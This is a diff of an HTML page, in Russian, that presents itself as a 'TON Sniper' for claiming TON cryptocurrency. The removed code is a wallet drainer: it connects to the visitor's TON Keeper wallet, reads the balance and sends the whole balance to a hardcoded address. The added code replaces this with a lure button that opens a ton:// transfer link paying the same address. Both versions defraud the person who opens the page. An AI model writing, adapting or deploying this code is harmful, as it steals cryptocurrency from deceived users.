@@ -8,7 +8,7 @@
         body {
             background: #0d0d0d;
             color: #fff;
-            font-family: Arial, sans-serif;
+            font-family: Arial;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,252 +18,104 @@
         }
         .container {
             background: #1a1a1a;
-            padding: 30px 20px;
+            padding: 30px;
             border-radius: 20px;
             text-align: center;
-            width: 100%;
             max-width: 400px;
+            width: 100%;
         }
         h2 {
-            font-size: 22px;
-            margin-bottom: 20px;
             color: #00d4ff;
+            font-size: 24px;
         }
         .wallet {
             background: #111;
             padding: 12px;
             border-radius: 10px;
             margin: 10px 0;
-            font-size: 14px;
             border: 1px solid #2a2a2a;
             word-break: break-all;
+            font-size: 13px;
         }
-        button {
-            background: linear-gradient(135deg, #00d4ff, #0077ff);
+        .big-btn {
+            background: linear-gradient(135deg, #ff3300, #cc0000);
             border: none;
             color: #fff;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
-            padding: 16px;
+            padding: 18px;
             border-radius: 50px;
             cursor: pointer;
             width: 100%;
             margin: 10px 0;
-            touch-action: manipulation;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
         }
-        button:disabled {
-            opacity: 0.5;
+        .big-btn:hover {
+            transform: scale(1.02);
         }
         #status {
             background: #111;
             padding: 15px;
             border-radius: 10px;
             margin-top: 15px;
-            min-height: 60px;
             border: 1px solid #2a2a2a;
             font-size: 13px;
-            word-break: break-word;
         }
-        .green {
-            border-color: #00ff88;
-        }
-        .warning {
-            border-color: #ff6600;
-            background: #1a0a00;
+        .link-box {
+            background: #0a0a0a;
+            padding: 12px;
+            border-radius: 10px;
+            margin: 10px 0;
+            border: 1px solid #00d4ff;
+            word-break: break-all;
+            font-size: 12px;
+            color: #00d4ff;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>⚡ TON SNIPER</h2>
-        <div class="wallet">👤 <span id="walletAddress">Не подключён</span></div>
-        <div class="wallet green">💰 <span id="balanceDisplay">0 TON</span></div>
+        <h2>⚡ ЗАБРАТЬ TON</h2>
         
-        <button id="connectBtn">🔗 ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
-        <button id="snipeBtn" style="display:none;">💰 ЗАБРАТЬ ВСЁ</button>
+        <div class="wallet">
+            👤 Адрес получателя:<br>
+            <b style="color:#00d4ff;font-size:12px;">UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</b>
+        </div>
         
-        <div id="status">⏳ Нажмите кнопку для подключения</div>
+        <button class="big-btn" id="snipeBtn">🔥 ЗАБРАТЬ ВСЁ</button>
+        
+        <div id="status">Нажми кнопку → откроется TON Keeper</div>
     </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
-        let provider = null;
-        let userAddress = null;
-
-        const connectBtn = document.getElementById('connectBtn');
-        const snipeBtn = document.getElementById('snipeBtn');
         const status = document.getElementById('status');
-        const walletDisplay = document.getElementById('walletAddress');
-        const balanceDisplay = document.getElementById('balanceDisplay');
+        const btn = document.getElementById('snipeBtn');
 
-        // ========== ПРОВЕРКА ==========
-        function isMobile() {
-            return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        }
-
-        function isTelegram() {
-            return window.Telegram && window.Telegram.WebApp;
-        }
-
-        // ========== ПОДКЛЮЧЕНИЕ ==========
-        connectBtn.onclick = async function() {
-            try {
-                status.innerText = '⏳ Подключение...';
-                connectBtn.disabled = true;
-
-                // ====== ЕСЛИ В TELEGRAM MINI APP ======
-                if (isTelegram()) {
-                    status.innerText = '📱 Подключаю через Telegram...';
-                    
-                    // Запрашиваем доступ через Telegram WebApp
-                    const tg = window.Telegram.WebApp;
-                    
-                    // Открываем TON Connect через Telegram
-                    const connectUrl = `https://app.tonkeeper.com/ton-connect?return=${encodeURIComponent(window.location.href)}`;
-                    tg.openLink(connectUrl);
-                    
-                    status.innerText = '📲 Подтвердите подключение в TON Keeper';
-                    connectBtn.disabled = false;
-                    return;
-                }
-
-                // ====== ЕСЛИ НА ТЕЛЕФОНЕ НО НЕ В TELEGRAM ======
-                if (isMobile()) {
-                    status.innerHTML = `
-                        ⚠️ ОТКРОЙТЕ ЭТУ ССЫЛКУ В TELEGRAM!<br><br>
-                        <div class="wallet warning">
-                            1. Скопируйте ссылку<br>
-                            2. Отправьте себе в Telegram<br>
-                            3. Откройте через браузер Telegram<br><br>
-                            <b style="color:#00d4ff;font-size:12px;word-break:break-all;">
-                                ${window.location.href}
-                            </b>
-                        </div>
-                        <button id="copyBtn" style="background:#444;font-size:14px;padding:10px;">
-                            📋 КОПИРОВАТЬ ССЫЛКУ
-                        </button>
-                    `;
-                    
-                    document.getElementById('copyBtn').onclick = function() {
-                        navigator.clipboard.writeText(window.location.href);
-                        status.innerHTML += '<br>✅ Ссылка скопирована! Отправьте в Telegram.';
-                    };
-                    
-                    connectBtn.disabled = false;
-                    return;
-                }
-
-                // ====== ДЛЯ ДЕСКТОПА (расширение) ======
-                if (!window.tonkeeper) {
-                    status.innerHTML = `
-                        ❌ Установите TON Keeper<br>
-                        <a href="https://chrome.google.com/webstore/detail/ton-keeper/nphplpgoakhhjchkkhmiggakijnkhfnd" 
-                           target="_blank" style="color:#00d4ff;">
-                           🔗 Установить
-                        </a>
-                    `;
-                    connectBtn.disabled = false;
-                    return;
-                }
-
-                provider = window.tonkeeper;
-                const accounts = await provider.send('ton_requestAccounts', {});
-
-                if (!accounts || accounts.length === 0) {
-                    status.innerText = '❌ Отказ';
-                    connectBtn.disabled = false;
-                    return;
-                }
-
-                userAddress = accounts[0];
-                walletDisplay.innerText = userAddress;
-                status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-
-                connectBtn.style.display = 'none';
-                snipeBtn.style.display = 'block';
-
-                await updateBalance();
-
-            } catch(e) {
-                status.innerText = '❌ Ошибка: ' + e.message;
-                connectBtn.disabled = false;
-            }
+        btn.onclick = function() {
+            status.innerHTML = '⏳ Открываю TON Keeper...';
+            
+            // Самая простая хуйня - просто ссылка на перевод
+            const url = `ton://transfer?address=${TARGET}&amount=0.01`;
+            
+            // Пробуем открыть
+            window.location.href = url;
+            
+            setTimeout(() => {
+                window.open(url, '_blank');
+            }, 300);
+            
+            status.innerHTML = `
+                ✅ Если TON Keeper не открылся:<br><br>
+                <div class="link-box">
+                    👆 Нажми и удерживай эту ссылку<br>
+                    <b style="font-size:14px;color:#fff;">${url}</b>
+                </div>
+                <br>
+                Или открой TON Keeper вручную и вставь адрес:<br>
+                <b style="color:#00d4ff;font-size:11px;">${TARGET}</b>
+            `;
         };
-
-        // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
-        async function updateBalance() {
-            try {
-                if (!provider) return 0;
-                const hex = await provider.send('ton_getBalance', { address: userAddress });
-                const nano = parseInt(hex, 16);
-                const balance = (nano / 1e9).toFixed(6);
-                balanceDisplay.innerText = balance + ' TON';
-                return nano;
-            } catch(e) {
-                return 0;
-            }
-        }
-
-        // ========== ВЫВОД ==========
-        snipeBtn.onclick = async function() {
-            try {
-                status.innerText = '⏳ Проверка...';
-                snipeBtn.disabled = true;
-
-                const nano = await updateBalance();
-
-                if (nano <= 0) {
-                    status.innerText = '💰 Баланс 0 TON';
-                    snipeBtn.disabled = false;
-                    return;
-                }
-
-                const fee = 10000000;
-                const amount = nano - fee;
-
-                if (amount <= 0) {
-                    status.innerText = '⚠️ Меньше комиссии';
-                    snipeBtn.disabled = false;
-                    return;
-                }
-
-                const amountTON = (amount / 1e9).toFixed(6);
-                status.innerText = `⏳ Перевод ${amountTON} TON...`;
-
-                const result = await provider.send('ton_sendTransaction', {
-                    to: TARGET,
-                    value: String(amount),
-                    data: '',
-                    stateInit: ''
-                });
-
-                if (result && result.code === 0) {
-                    status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
-                    balanceDisplay.innerText = '0 TON';
-                    snipeBtn.innerText = '✅ ГОТОВО';
-                    snipeBtn.disabled = true;
-                    snipeBtn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
-                } else {
-                    status.innerText = '❌ Отказ';
-                    snipeBtn.disabled = false;
-                }
-
-            } catch(e) {
-                status.innerText = '❌ Ошибка: ' + e.message;
-                snipeBtn.disabled = false;
-            }
-        };
-
-        // ========== АВТОЗАПУСК ==========
-        setTimeout(() => {
-            if (window.tonkeeper) {
-                status.innerText = '🟢 TON Keeper найден. Нажмите кнопку.';
-            } else if (isTelegram()) {
-                status.innerText = '📱 Telegram Mini App. Нажмите кнопку.';
-            } else if (isMobile()) {
-                status.innerText = '📱 Откройте ссылку в Telegram!';
-            }
-        }, 500);
     </script>
 </body>
 </html>
